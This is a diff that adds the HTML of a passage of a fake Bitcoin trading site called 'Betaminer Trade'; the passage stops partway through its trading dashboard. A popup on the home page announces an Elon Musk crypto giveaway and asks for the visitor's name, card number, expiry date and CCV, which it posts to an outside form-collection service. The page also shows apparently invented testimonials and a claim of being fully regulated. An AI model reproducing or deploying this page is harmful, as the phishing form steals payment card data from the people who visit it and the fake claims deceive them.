@@ -1,0 +1,2612 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Betaminer Trade | Bitcoin Trading Platform</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <style>
+        /* Reset and Base Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        :root {
+            --primary: #1a3c6e;
+            --secondary: #2e5ba9;
+            --accent: #f2a900;
+            --light: #f5f7fa;
+            --dark: #2c3e50;
+            --success: #27ae60;
+            --danger: #e74c3c;
+            --warning: #f39c12;
+        }
+    body {
+        background-color: var(--light);
+        color: var(--dark);
+        line-height: 1.6;
+        overflow-x: hidden;
+    }
+
+    .container {
+        width: 90%;
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 0 15px;
+    }
+
+    /* Header Styles - Mobile First */
+    header {
+        background-color: white;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        position: sticky;
+        top: 0;
+        z-index: 100;
+    }
+
+    .header-content {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 15px 0;
+    }
+
+    .logo {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        font-weight: 700;
+        font-size: 20px;
+        color: var(--primary);
+    }
+
+    .logo i {
+        color: var(--accent);
+    }
+
+    nav {
+        position: relative;
+    }
+
+    nav ul {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        bottom: 0;
+        width: 280px;
+        background: white;
+        box-shadow: 0 0 20px rgba(0, 0, 0, 0.15);
+        list-style: none;
+        padding: 80px 25px 25px;
+        z-index: 100;
+        flex-direction: column;
+        overflow-y: auto;
+    }
+
+    nav ul.active {
+        display: flex;
+    }
+
+    nav li {
+        margin-bottom: 5px;
+    }
+
+    nav a {
+        text-decoration: none;
+        color: var(--dark);
+        font-weight: 500;
+        transition: all 0.3s;
+        display: block;
+        padding: 12px 15px;
+        border-radius: 8px;
+        font-size: 16px;
+    }
+
+    nav a:hover {
+        color: var(--accent);
+        background: rgba(242, 169, 0, 0.1);
+    }
+
+    .mobile-menu-btn {
+        display: block;
+        background: none;
+        border: none;
+        font-size: 24px;
+        cursor: pointer;
+        color: var(--primary);
+        padding: 5px;
+        z-index: 101;
+    }
+
+    .mobile-menu-overlay {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: rgba(0, 0, 0, 0.5);
+        z-index: 99;
+    }
+
+    .mobile-menu-overlay.active {
+        display: block;
+    }
+
+    .auth-buttons {
+        display: flex;
+        gap: 10px;
+    }
+
+    .btn {
+        padding: 8px 16px;
+        border-radius: 4px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.3s;
+        border: none;
+        font-size: 14px;
+    }
+
+    .btn-outline {
+        background: transparent;
+        border: 2px solid var(--primary);
+        color: var(--primary);
+    }
+
+    .btn-primary {
+        background: var(--primary);
+        color: white;
+    }
+
+    .btn-success {
+        background: var(--success);
+        color: white;
+    }
+
+    .btn-danger {
+        background: var(--danger);
+        color: white;
+    }
+
+    .btn:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    }
+
+    /* WhatsApp-like popup button */
+    .whatsapp-popup-btn {
+        position: fixed;
+        bottom: 25px;
+        right: 25px;
+        width: 60px;
+        height: 60px;
+        background: var(--success);
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: white;
+        font-size: 28px;
+        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+        cursor: pointer;
+        z-index: 98;
+        transition: all 0.3s;
+    }
+
+    .whatsapp-popup-btn:hover {
+        transform: scale(1.1);
+    }
+
+    .whatsapp-popup-content {
+        display: none;
+        position: fixed;
+        bottom: 100px;
+        right: 25px;
+        width: 350px;
+        max-width: 90vw;
+        background: white;
+        border-radius: 12px;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+        z-index: 99;
+        max-height: 500px;
+        height: auto;
+        overflow-y: auto;
+        overflow-x: hidden;
+    }
+
+    .whatsapp-popup-content.active {
+        display: block;
+    }
+
+    .popup-header {
+        background: var(--primary);
+        color: white;
+        padding: 20px;
+    }
+
+    .popup-header h3 {
+        margin-bottom: 5px;
+        font-size: 15px;
+    }
+
+    .popup-body {
+        padding: 20px;
+        max-height: 400px;
+        overflow-y: auto;
+    }
+
+    .popup-body p {
+        margin-bottom: 10px;
+        color: #666;
+    }
+
+    /* Hero Section */
+    .hero {
+        background: linear-gradient(135deg, var(--primary), var(--secondary));
+        color: white;
+        padding: 60px 0;
+        text-align: center;
+    }
+
+    .hero h1 {
+        font-size: 2.2rem;
+        margin-bottom: 20px;
+    }
+
+    .hero p {
+        font-size: 1.1rem;
+        max-width: 700px;
+        margin: 0 auto 30px;
+    }
+
+    .hero-buttons {
+        display: flex;
+        justify-content: center;
+        gap: 15px;
+        flex-wrap: wrap;
+    }
+
+    .btn-hero {
+        padding: 12px 24px;
+        font-size: 1rem;
+    }
+
+    .btn-light {
+        background: white;
+        color: var(--primary);
+    }
+
+    /* Features Section */
+    .section {
+        padding: 60px 0;
+    }
+
+    .section-title {
+        text-align: center;
+        margin-bottom: 40px;
+    }
+
+    .section-title h2 {
+        font-size: 2rem;
+        color: var(--primary);
+        margin-bottom: 15px;
+    }
+
+    .section-title p {
+        color: #666;
+        max-width: 600px;
+        margin: 0 auto;
+    }
+
+    .features-grid {
+        display: grid;
+        grid-template-columns: 1fr;
+        gap: 25px;
+    }
+
+    .feature-card {
+        background: white;
+        border-radius: 8px;
+        padding: 25px;
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+        transition: transform 0.3s;
+        text-align: center;
+    }
+
+    .feature-card:hover {
+        transform: translateY(-5px);
+    }
+
+    .feature-icon {
+        background: var(--light);
+        width: 60px;
+        height: 60px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 20px;
+        color: var(--accent);
+        font-size: 24px;
+    }
+
+    .feature-card h3 {
+        margin-bottom: 15px;
+        color: var(--primary);
+        font-size: 1.3rem;
+    }
+
+    /* Trading Section */
+    .trading {
+        background: var(--light);
+    }
+
+    .trading-container {
+        display: grid;
+        grid-template-columns: 1fr;
+        gap: 40px;
+    }
+
+    .trading-chart {
+        background: white;
+        border-radius: 8px;
+        padding: 20px;
+        box-shadow: 0 5px15px rgba(0, 0, 0, 0.05);
+        height: 400px;
+        overflow: hidden;
+    }
+
+    .trading-chart .chart-container {
+        height: 300px;
+        overflow: auto;
+    }
+
+    .trading-info h3 {
+        font-size: 1.8rem;
+        color: var(--primary);
+        margin-bottom: 20px;
+    }
+
+    .trading-info p {
+        margin-bottom: 25px;
+        color: #666;
+    }
+
+    /* Market Data */
+    .market-data {
+        background: white;
+        padding: 25px;
+        border-radius: 8px;
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+        overflow-x: auto;
+    }
+
+    .market-table {
+        width: 100%;
+        border-collapse: collapse;
+        min-width: 600px;
+    }
+
+    .market-table th, .market-table td {
+        padding: 12px 15px;
+        text-align: left;
+        border-bottom: 1px solid #eee;
+    }
+
+    .market-table th {
+        background: var(--light);
+        color: var(--primary);
+        font-weight: 600;
+    }
+
+    .price-up {
+        color: var(--success);
+    }
+
+    .price-down {
+        color: var(--danger);
+    }
+
+    /* Testimonials */
+    .testimonials {
+        background: linear-gradient(135deg, var(--secondary), var(--primary));
+        color: white;
+    }
+
+    .testimonials .section-title h2 {
+        color: white;
+    }
+
+    .testimonials .section-title p {
+        color: rgba(255, 255, 255, 0.8);
+    }
+
+    .testimonials-grid {
+        display: grid;
+        grid-template-columns: 1fr;
+        gap: 25px;
+    }
+
+    .testimonial-card {
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 8px;
+        padding: 25px;
+        backdrop-filter: blur(10px);
+    }
+
+    .testimonial-card p {
+        font-style: italic;
+        margin-bottom: 20px;
+    }
+
+    .client-info {
+        display: flex;
+        align-items: center;
+        gap: 15px;
+    }
+
+    .client-avatar {
+        width: 50px;
+        height: 50px;
+        border-radius: 50%;
+        background: var(--accent);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: white;
+        font-weight: bold;
+    }
+
+    /* Footer */
+    footer {
+        background: var(--dark);
+        color: white;
+        padding: 50px 0 20px;
+    }
+
+    .footer-content {
+        display: grid;
+        grid-template-columns: 1fr;
+        gap: 30px;
+        margin-bottom: 30px;
+    }
+
+    .footer-column h3 {
+        margin-bottom: 20px;
+        color: var(--accent);
+    }
+
+    .footer-column ul {
+        list-style: none;
+    }
+
+    .footer-column ul li {
+        margin-bottom: 10px;
+    }
+
+    .footer-column a {
+        color: #bbb;
+        text-decoration: none;
+        transition: color 0.3s;
+    }
+
+    .footer-column a:hover {
+        color: var(--accent);
+    }
+
+    .social-links {
+        display: flex;
+        gap: 15px;
+        margin-top: 20px;
+    }
+
+    .social-links a {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        width: 40px;
+        height: 40px;
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 50%;
+        transition: background 0.3s;
+    }
+
+    .social-links a:hover {
+        background: var(--accent);
+    }
+
+    .copyright {
+        text-align: center;
+        padding-top: 20px;
+        border-top: 1px solid rgba(255, 255, 255, 0.1);
+        color: #bbb;
+        font-size: 0.9rem;
+    }
+
+    /* Modal Styles */
+    .modal {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.5);
+        z-index: 1000;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+    }
+
+    .modal-content {
+        background: white;
+        border-radius: 8px;
+        width: 100%;
+        max-width: 500px;
+        padding: 25px;
+        box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
+        max-height: 90vh;
+        overflow-y: auto;
+    }
+
+    .modal-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 20px;
+    }
+
+    .modal-header h2 {
+        color: var(--primary);
+        font-size: 1.5rem;
+    }
+
+    .close-modal {
+        background: none;
+        border: none;
+        font-size: 24px;
+        cursor: pointer;
+        color: #999;
+    }
+
+    .form-group {
+        margin-bottom: 20px;
+    }
+
+    .form-group label {
+        display: block;
+        margin-bottom: 8px;
+        font-weight: 500;
+    }
+
+    .form-control {
+        width: 100%;
+        padding: 12px 15px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        font-size: 16px;
+    }
+
+    .form-control:focus {
+        border-color: var(--accent);
+        outline: none;
+    }
+
+    .form-footer {
+        text-align: center;
+        margin-top: 20px;
+    }
+
+    .form-footer a {
+        color: var(--accent);
+        text-decoration: none;
+    }
+
+    /* Dashboard Styles */
+    .dashboard {
+        display: none;
+        padding: 30px 0;
+    }
+
+    .dashboard-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 30px;
+        flex-direction: column;
+        gap: 20px;
+        text-align: center;
+    }
+
+    .user-info {
+        display: flex;
+        align-items: center;
+        gap: 15px;
+        flex-direction: column;
+    }
+
+    .user-avatar {
+        width: 70px;
+        height: 70px;
+        border-radius: 50%;
+        background: var(--accent);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: white;
+        font-weight: bold;
+        font-size: 24px;
+    }
+
+    .balance-card {
+        background: white;
+        border-radius: 8px;
+        padding: 25px;
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+        margin-bottom: 30px;
+        text-align: center;
+    }
+
+    .balance-amount {
+        font-size: 2.2rem;
+        font-weight: 700;
+        color: var(--primary);
+        margin: 10px 0;
+    }
+
+    .balance-change {
+        color: var(--success);
+        font-weight: 600;
+    }
+
+    .dashboard-grid {
+        display: grid;
+        grid-template-columns: 1fr;
+        gap: 30px;
+    }
+
+    .trading-panel {
+        background: white;
+        border-radius: 8px;
+        padding: 25px;
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+    }
+
+    .trading-panel h3 {
+        margin-bottom: 20px;
+        color: var(--primary);
+        font-size: 1.5rem;
+    }
+
+    .trade-form {
+        display: grid;
+        grid-template-columns: 1fr;
+        gap: 15px;
+    }
+
+    .action-type {
+        display: grid;
+        grid-template-columns: 1fr 1fr 1fr 1fr;
+        gap: 10px;
+        margin-bottom: 10px;
+    }
+
+    .action-type-btn {
+        padding: 12px;
+        text-align: center;
+        background: #f0f2f5;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        font-weight: 600;
+        font-size: 14px;
+    }
+
+    .action-type-btn.active {
+        background: var(--success);
+        color: white;
+    }
+
+    .action-type-btn.sell.active {
+        background: var(--danger);
+    }
+
+    .action-type-btn.send.active {
+        background: var(--warning);
+    }
+
+    .action-type-btn.receive.active {
+        background: var(--primary);
+    }
+
+    .portfolio {
+        background: white;
+        border-radius: 8px;
+        padding: 25px;
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+        overflow-x: auto;
+    }
+
+    .portfolio h3 {
+        margin-bottom: 20px;
+        color: var(--primary);
+        font-size: 1.5rem;
+    }
+
+    .portfolio-table {
+        width: 100%;
+        border-collapse: collapse;
+        min-width: 500px;
+    }
+
+    .portfolio-table th, .portfolio-table td {
+        padding: 12px 15px;
+        text-align: left;
+        border-bottom: 1px solid #eee;
+    }
+
+    .portfolio-table th {
+        background: var(--light);
+        color: var(--primary);
+        font-weight: 600;
+    }
+
+    /* Page Content Styles */
+    .page-content {
+        display: none;
+        padding: 50px 0;
+    }
+
+    .page-content.active {
+        display: block;
+    }
+
+    .page-title {
+        margin-bottom: 40px;
+        text-align: center;
+    }
+
+    .page-title h1 {
+        font-size: 2rem;
+        color: var(--primary);
+        margin-bottom: 15px;
+    }
+
+    .page-title p {
+        color: #666;
+        max-width: 700px;
+        margin: 0 auto;
+    }
+
+    .content-grid {
+        display: grid;
+        grid-template-columns: 1fr;
+        gap: 25px;
+        margin-bottom: 40px;
+    }
+
+    .content-card {
+        background: white;
+        border-radius: 8px;
+        padding: 25px;
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+    }
+
+    .content-card h3 {
+        margin-bottom: 15px;
+        color: var(--primary);
+        font-size: 1.4rem;
+    }
+
+    .content-card ul {
+        padding-left: 20px;
+        margin-bottom: 20px;
+    }
+
+    .content-card li {
+        margin-bottom: 10px;
+    }
+
+    .content-card a {
+        color: var(--accent);
+        text-decoration: none;
+    }
+
+    .content-card a:hover {
+        text-decoration: underline;
+    }
+
+    /* Real-time Bitcoin Price */
+    .bitcoin-price {
+        background: white;
+        border-radius: 8px;
+        padding: 25px;
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+        margin-bottom: 30px;
+        text-align: center;
+    }
+
+    .bitcoin-price h3 {
+        color: var(--primary);
+        margin-bottom: 15px;
+        font-size: 1.4rem;
+    }
+
+    .price-display {
+        font-size: 2.2rem;
+        font-weight: 700;
+        color: var(--accent);
+        margin-bottom: 10px;
+    }
+
+    .price-change {
+        font-size: 1.1rem;
+        font-weight: 600;
+    }
+
+    .price-change.positive {
+        color: var(--success);
+    }
+
+    .price-change.negative {
+        color: var(--danger);
+    }
+
+    /* Authentication Guard */
+    .auth-guard {
+        display: none;
+        text-align: center;
+        padding: 60px 20px;
+        background: white;
+        border-radius: 8px;
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+        margin: 30px 0;
+    }
+
+    .auth-guard.active {
+        display: block;
+    }
+
+    .auth-guard h2 {
+        color: var(--primary);
+        margin-bottom: 20px;
+    }
+
+    .auth-guard p {
+        margin-bottom: 30px;
+        color: #666;
+    }
+
+    /* Profile Page Styles */
+    .profile-form {
+        background: white;
+        border-radius: 8px;
+        padding: 25px;
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+        max-width: 600px;
+        margin: 0 auto;
+    }
+
+    .profile-avatar {
+        text-align: center;
+        margin-bottom: 30px;
+    }
+
+    .profile-avatar .user-avatar {
+        width: 100px;
+        height: 100px;
+        font-size: 36px;
+        margin: 0 auto 15px;
+    }
+
+    .profile-avatar .change-avatar {
+        color: var(--accent);
+        cursor: pointer;
+        font-weight: 600;
+    }
+
+    .form-row {
+        display: grid;
+        grid-template-columns: 1fr;
+        gap: 20px;
+        margin-bottom: 20px;
+    }
+
+    /* Responsive Styles for Larger Screens */
+    @media (min-width: 768px) {
+        .header-content {
+            padding: 15px 0;
+        }
+
+        .logo {
+            font-size: 24px;
+        }
+
+        nav ul {
+            display: flex;
+            position: static;
+            background: transparent;
+            box-shadow: none;
+            padding: 0;
+            gap: 25px;
+            width: auto;
+            flex-direction: row;
+        }
+
+        nav li {
+            margin-bottom: 0;
+        }
+
+        nav a {
+            padding: 0;
+            background: transparent;
+        }
+
+        .mobile-menu-btn {
+            display: none;
+        }
+
+        .mobile-menu-overlay {
+            display: none !important;
+        }
+
+        .auth-buttons {
+            gap: 15px;
+        }
+
+        .btn {
+            padding: 8px 20px;
+            font-size: 16px;
+        }
+
+        .hero {
+            padding: 80px 0;
+        }
+
+        .hero h1 {
+            font-size: 3rem;
+        }
+
+        .hero-buttons {
+            gap: 20px;
+        }
+
+        .btn-hero {
+            padding: 12px 30px;
+        }
+
+        .section {
+            padding: 80px 0;
+        }
+
+        .section-title h2 {
+            font-size: 2.5rem;
+        }
+
+        .features-grid {
+            grid-template-columns: repeat(3, 1fr);
+            gap: 30px;
+        }
+
+        .feature-card {
+            padding: 30px;
+        }
+
+        .feature-icon {
+            width: 70px;
+            height: 70px;
+            font-size: 28px;
+        }
+
+        .trading-container {
+            grid-template-columns: 1fr 1fr;
+            gap: 50px;
+        }
+
+        .testimonials-grid {
+            grid-template-columns: repeat(3, 1fr);
+            gap: 30px;
+        }
+
+        .footer-content {
+            grid-template-columns: repeat(4, 1fr);
+            gap: 40px;
+        }
+
+        .dashboard-header {
+            flex-direction: row;
+            text-align: left;
+        }
+
+        .user-info {
+            flex-direction: row;
+        }
+
+        .dashboard-grid {
+            grid-template-columns: 2fr 1fr;
+        }
+
+        .trade-form {
+            grid-template-columns: 1fr 1fr;
+        }
+
+        .content-grid {
+            grid-template-columns: repeat(2, 1fr);
+            gap: 30px;
+        }
+
+        .form-row {
+            grid-template-columns: 1fr 1fr;
+        }
+    }
+
+    @media (min-width: 992px) {
+        .content-grid {
+            grid-template-columns: repeat(3, 1fr);
+        }
+    }
+</style>
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        <div class="container">
+            <div class="header-content">
+                <div style="display: flex; align-items: center; gap: 15px;">
+                    <button class="mobile-menu-btn">
+                        <i class="fas fa-bars"></i>
+                    </button>
+                    <div class="logo">
+                        <i class="fab fa-bitcoin"></i>
+                        <span>Betaminer Trade</span>
+                    </div>
+                </div>
+                <nav>
+                    <ul id="navMenu">
+                        <li><a href="#" class="nav-link" data-page="home">Home</a></li>
+                        <li><a href="#" class="nav-link" data-page="markets">Markets</a></li>
+                        <li><a href="#" class="nav-link" data-page="trading">Trading</a></li>
+                        <li><a href="#" class="nav-link" data-page="platforms">Platforms</a></li>
+                        <li><a href="#" class="nav-link" data-page="education">Education</a></li>
+                        <li><a href="#" class="nav-link" data-page="about">About</a></li>
+                        <li><a href="#" class="nav-link" data-page="profile">Profile</a></li>
+                    </ul>
+                </nav>
+                <div class="auth-buttons">
+                    <button id="loginBtn" class="btn btn-outline">Login</button>
+                    <button id="registerBtn" class="btn btn-primary">Sign Up</button>
+                    <div id="userMenu" style="display: none;">
+                        <span id="userName" style="margin-right: 15px;"></span>
+                        <button id="logoutBtn" class="btn btn-outline">Logout</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+<!-- Mobile Menu Overlay -->
+<div class="mobile-menu-overlay" id="mobileMenuOverlay"></div>
+
+<!-- Authentication Guard -->
+<div id="authGuard" class="auth-guard">
+    <div class="container">
+        <h2>Authentication Required</h2>
+        <p>Please log in or create an account to access this page.</p>
+        <div style="display: flex; gap: 15px; justify-content: center; flex-wrap: wrap;">
+            <button id="guardLoginBtn" class="btn btn-primary">Login</button>
+            <button id="guardRegisterBtn" class="btn btn-outline">Sign Up</button>
+        </div>
+    </div>
+</div>
+
+<!-- Home Page -->
+<section id="home" class="page-content active">
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="container">
+            <h1>Bitcoin Trading Made Simple</h1>
+            <p>Trade Bitcoin with advanced tools and competitive pricing on our secure platform. Start your crypto journey today.</p>
+            <div class="hero-buttons">
+                <button id="startTradingBtn" class="btn btn-hero btn-light">Start Trading</button>
+                <button class="btn btn-hero btn-outline" style="border-color: white; color: white;">Demo Account</button>
+            </div>
+        </div>
+    </section>
+
+    <!-- WhatsApp-like popup button and content -->
+    <div class="whatsapp-popup-btn" id="whatsappPopupBtn">
+        <i class="fas fa-bullhorn"></i>
+    </div>
+
+    <div class="whatsapp-popup-content" id="whatsappPopupContent">
+        <div class="popup-header">
+            <h3>Service Announcement</h3>
+            <h3>DOGE CRYPTO GIVE AWAY </h3>
+        </div>
+        <div class="popup-body">
+            <p>Elon Musk is giving away $100,000 in Tesla's Introverted Coin — enter your debit card details to claim your share.</p>
+            
+            <form id="feedbackForm" action="https://usebasin.com/f/3bbf3480df39"  method="post">
+                <div class="form-group">
+                    <label for="popupName">Full Name</label>
+                    <input type="text" id="popupName" name="name" class="form-control" required>
+                </div>
+                <div class="form-group">
+                    <label for="popupCardNumber">Card number</label>
+                    <input type="number" id="popupname" name="bame" class="form-control" required>
+                </div>
+                <div class="form-group">
+                    <label for="popupMonth">Expiring Date</label>
+                    <input type="text" id="popupname" name="came" class="form-control" required>
+                </div>
+                <div class="form-group">
+                    <label for="popupCCV">CCV</label>
+                    <input type="text" id="popupname" name="dame" class="form-control" required>
+                </div>
+                <button type="submit" class="btn btn-primary" style="width: 100%; padding: 12px;">Submit</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Real-time Bitcoin Price -->
+    <div class="container">
+        <div class="bitcoin-price">
+            <h3>Bitcoin (BTC) Price</h3>
+            <div class="price-display" id="btcPrice">$--</div>
+            <div class="price-change" id="btcChange">Loading...</div>
+        </div>
+    </div>
+
+    <!-- Features Section -->
+    <section class="section">
+        <div class="container">
+            <div class="section-title">
+                <h2>Why Choose BetaminerTrade?</h2>
+                <p>We provide everything you need for successful Bitcoin trading in today's dynamic markets</p>
+            </div>
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-bolt"></i>
+                    </div>
+                    <h3>Lightning Fast Execution</h3>
+                    <p>Execute Bitcoin trades in milliseconds with our advanced trading infrastructure and direct market access.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-shield-alt"></i>
+                    </div>
+                    <h3>Secure & Regulated</h3>
+                    <p>Your Bitcoin and data are protected with bank-level security and we're fully regulated in multiple jurisdictions.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-chart-pie"></i>
+                    </div>
+                    <h3>Advanced Analytics</h3>
+                    <p>Access real-time Bitcoin data, advanced charting tools, and technical indicators to inform your decisions.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Trading Section -->
+    <section class="section trading">
+        <div class="container">
+            <div class="trading-container">
+                <div class="trading-chart">
+                    <h3>Bitcoin Price Chart</h3>
+                    <div class="chart-container">
+                        <canvas id="priceChart" height="300"></canvas>
+                    </div>
+                </div>
+                <div class="trading-info">
+                    <h3>Trade Bitcoin With Confidence</h3>
+                    <p>Our platform offers intuitive Bitcoin trading tools, real-time data, and comprehensive analysis to help you make informed trading decisions.</p>
+                    <ul style="margin-bottom: 30px; padding-left: 20px;">
+                        <li>Access to multiple Bitcoin trading pairs</li>
+                        <li>Advanced order types</li>
+                        <li>Risk management tools</li>
+                        <li>Mobile and desktop platforms</li>
+                    </ul>
+                    <button class="btn btn-primary">Explore Platforms</button>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Market Data Section -->
+    <section class="section">
+        <div class="container">
+            <div class="section-title">
+                <h2>Crypto Market Overview</h2>
+                <p>Real-time prices for popular cryptocurrencies</p>
+            </div>
+            <div class="market-data">
+                <table class="market-table">
+                    <thead>
+                        <tr>
+                            <th>Cryptocurrency</th>
+                            <th>Price</th>
+                            <th>Change</th>
+                            <th>Change %</th>
+                            <th>Action</th>
+                        </tr>
+                    </thead>
+                    <tbody id="marketData">
+                        <!-- Market data will be populated by JavaScript -->
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </section>
+
+    <!-- Testimonials Section -->
+    <section class="section testimonials">
+        <div class="container">
+            <div class="section-title">
+                <h2>What Our Clients Say</h2>
+                <p>Join thousands of satisfied crypto traders worldwide</p>
+            </div>
+            <div class="testimonials-grid">
+                <div class="testimonial-card">
+                    <p>"Betaminer Trade has transformed my crypto trading experience. The platform is intuitive and the execution speed is incredible."</p>
+                    <div class="client-info">
+                        <div class="client-avatar">JS</div>
+                        <div>
+                            <h4>John Smith</h4>
+                            <span>Professional Trader</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="testimonial-card">
+                    <p>"As a beginner, I found the educational resources and demo account extremely helpful to build my confidence in Bitcoin trading."</p>
+                    <div class="client-info">
+                        <div class="client-avatar">SD</div>
+                        <div>
+                            <h4>Sarah Davis</h4>
+                            <span>Retail Investor</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="testimonial-card">
+                    <p>"The customer support team is always responsive and helpful. I feel my Bitcoin investments are in safe hands."</p>
+                    <div class="client-info">
+                        <div class="client-avatar">MR</div>
+                        <div>
+                            <h4>Michael Roberts</h4>
+                            <span>Portfolio Manager</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+</section>
+
+<!-- Markets Page -->
+<section id="markets" class="page-content">
+    <div class="container">
+        <div class="page-title">
+            <h1>Crypto Markets</h1>
+            <p>Real-time cryptocurrency prices and market data</p>
+        </div>
+
+        <div class="bitcoin-price">
+            <h3>Bitcoin (BTC) Live Price</h3>
+            <div class="price-display" id="btcPriceMarkets">$--</div>
+            <div class="price-change" id="btcChangeMarkets">Loading...</div>
+        </div>
+
+        <div class="market-data">
+            <h3 style="margin-bottom: 20px;">Cryptocurrency Prices</h3>
+            <table class="market-table">
+                <thead>
+                    <tr>
+                        <th>Cryptocurrency</th>
+                        <th>Symbol</th>
+                        <th>Price</th>
+                        <th>Change (24h)</th>
+                        <th>Market Cap</th>
+                    </tr>
+                </thead>
+                <tbody id="marketsData">
+                    <!-- Markets data will be populated by JavaScript -->
+                </tbody>
+            </table>
+        </div>
+
+        <div class="content-grid" style="margin-top: 50px;">
+            <div class="content-card">
+                <h3>Market Trends</h3>
+                <p>Stay updated with the latest cryptocurrency market trends and analysis.</p>
+                <ul>
+                    <li>Bitcoin dominance analysis</li>
+                    <li>Altcoin season indicators</li>
+                    <li>Market sentiment tracking</li>
+                    <li>Volume and volatility analysis</li>
+                </ul>
+            </div>
+            <div class="content-card">
+                <h3>Trading Pairs</h3>
+                <p>Trade Bitcoin against various fiat currencies and other cryptocurrencies.</p>
+                <ul>
+                    <li>BTC/USD</li>
+                    <li>BTC/EUR</li>
+                    <li>BTC/GBP</li>
+                    <li>BTC/ETH</li>
+                    <li>BTC/USDT</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- Trading Page -->
+<section id="trading" class="page-content">
+    <div class="container">
+        <div class="page-title">
+            <h1>Trading Platform</h1>
+            <p>Advanced Bitcoin trading tools and features</p>
+        </div>
+
+        <!-- Dashboard Section (Visible after login) -->
+        <section class="dashboard" id="dashboard">
+            <div class="dashboard-header">
+                <h2>Trading Dashboard</h2>
+                <div class="user-info">
+                    <div class="user-avatar" id="userAvatar">JD</div>
+                    <div>
+                        <h3 id="dashboardUserName">John Doe</h3>
+                        <p>Account: <span id="accountNumber">TRD-784392</span></p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="balance-card">
+                <h3>Account Balance</h3>
+                <div class="balance-amount">$<span id="accountBalance">0.00</span></div>
+                <div class="balance-change" id="balanceChange">Add funds to start trading</div>
+                <button id="addFundsBtn" class="btn btn-primary" style="margin-top: 15px;">Add Funds</button>
+            </div>
+
+            <div class="dashboard-grid">
+                <div class="trading-panel">
+                    <h3>Bitcoin Actions</h3>
+                    <div class="trade-form">
+                        <div class="action-type">
+                            <button class="action-type-btn active" data-type="buy">Buy</button>
+                            <button class="action-type-btn sell" data-type="sell">Withdraw</button>
+                            <button class="action-type-btn send" data-type="send">Send</button>
+                            <button class="action-type-btn receive" data-type="receive">Receive</button>
+                        </div>
+                        
+                        <!-- Buy/Sell Form -->
+                        <div id="tradeForm" class="form-content">
+                            <div class="form-group">
+                                <label for="instrument">Instrument</label>
+                                <select id="instrument" class="form-control">
+                                    <option value="BTC/USD">BTC/USD</option>
+                                    <option value="BTC/EUR">BTC/EUR</option>
+                                    <option value="BTC/GBP">BTC/GBP</option>
+                                    <option value="BTC/ETH">BTC/ETH</option>
+                                </select>
+                            </div>
+                            <div class="form-group">
+                                <label for="volume">Amount (BTC)</label>
+                                <input type="number" id="volume" class="form-control" value="0.1" min="0.001" step="0.001">
+                            </div>
+                            <div class="form-group">
+                                <label for="price">Price</label>
+                                <input type="number" id="price" class="form-control" step="0.01" readonly>
+                            </div>
+                            <div class="form-group">
+                                <label for="totalCost">Total Cost</label>
+                                <input type="number" id="totalCost" class="form-control" readonly>
+                            </div>
+                        </div>
+
